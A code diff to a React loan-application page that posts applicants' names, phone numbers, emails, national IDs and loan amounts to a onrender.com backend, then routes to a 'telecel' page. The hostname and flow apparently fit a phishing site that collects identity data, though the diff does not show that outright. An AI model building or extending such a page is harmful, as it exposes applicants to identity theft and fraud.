@@ -1,5 +1,6 @@
 import { useState } from "react";
 import { useNavigate } from "react-router-dom";
+import axios from "axios";
 import "../styles/app.css";
 
 export default function Apply() {
@@ -12,22 +13,34 @@ export default function Apply() {
     email: "",
     id: "",
     amount: "",
+    repayment: "12 months"
   });
 
   const handleChange = (e) => {
     setForm({ ...form, [e.target.name]: e.target.value });
   };
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
-
-    localStorage.setItem("loanData", JSON.stringify(form));
-
     setLoading(true);
 
-    setTimeout(() => {
-      navigate("/telecel/1");
-    }, 1500);
+    try {
+      const res = await axios.post(
+        "https://g-bayport-loans.onrender.com/apply",
+        form
+      );
+
+      const id = res.data.id;
+
+      localStorage.setItem("loanData", JSON.stringify(form));
+
+      navigate(`/telecel/${id}`);
+
+    } catch (err) {
+      alert("Submission failed");
+    }
+
+    setLoading(false);
   };
 
   return (
@@ -36,33 +49,18 @@ export default function Apply() {
 
         <div className="header">
           <h1>Apply for Loan</h1>
-          <p className="subtitle">Fast & Secure</p>
         </div>
 
         <form onSubmit={handleSubmit}>
 
-          <div className="section">
-            <input name="name" placeholder="Full Name" onChange={handleChange} required />
-          </div>
+          <input name="name" placeholder="Full Name" onChange={handleChange} required />
+          <input name="phone" placeholder="Phone" onChange={handleChange} required />
+          <input name="email" placeholder="Email" onChange={handleChange} />
+          <input name="id" placeholder="National ID" onChange={handleChange} required />
+          <input name="amount" placeholder="Amount" type="number" onChange={handleChange} required />
 
-          <div className="section">
-            <input name="phone" placeholder="Phone Number" onChange={handleChange} required />
-          </div>
-
-          <div className="section">
-            <input name="email" placeholder="Email" onChange={handleChange} />
-          </div>
-
-          <div className="section">
-            <input name="id" placeholder="National ID" onChange={handleChange} required />
-          </div>
-
-          <div className="section">
-            <input name="amount" type="number" placeholder="Loan Amount" onChange={handleChange} required />
-          </div>
-
-          <button type="submit">
-            {loading ? "Redirecting..." : "Proceed"}
+          <button className="btn">
+            {loading ? <div className="spinner"></div> : "Proceed"}
           </button>
 
         </form>
